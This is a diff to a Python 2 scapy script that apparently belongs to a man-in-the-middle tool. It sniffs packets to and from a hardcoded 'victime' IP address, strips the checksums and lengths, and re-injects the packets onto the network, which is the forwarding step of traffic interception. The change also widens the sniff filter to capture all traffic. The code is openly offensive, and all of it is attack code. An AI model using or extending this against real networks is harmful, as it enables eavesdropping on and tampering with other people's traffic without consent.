@@ -36,18 +36,27 @@ def pr(x):
     try:
         global victime_ip
         print victime_ip
-        if x['IP'].dst ==  or x['IP'].src == victime_ip:
-            #print x['IP'].dst
+        if x['IP'].dst == '192.168.6.122' or x['IP'].src == '192.168.6.122':
+            del x['IP'].chksum
+            if x.haslayer(scapy.all.UDP):
+                del x['UDP'].chksum
+                del x['UDP'].len
+
+            if x.haslayer(scapy.all.TCP):
+                del x['TCP'].chksum
+                del x['TCP'].len
+
             x.show()
             #if x['IP'].dst == '192.168.0.2':
             #    x['Ethernet'].dst=getMac('192.168.0.2')
             #    x.show();
             scapy.all.sendp(x, iface='en0')
     except Exception, err:
+        print err
         pass
 
 def sniffing():
-    scapy.all.sniff(prn=pr, filter='host 192.168.0.2')
+    scapy.all.sniff(prn=pr)
 
 def main():
     #if os.geteuid() != 0:
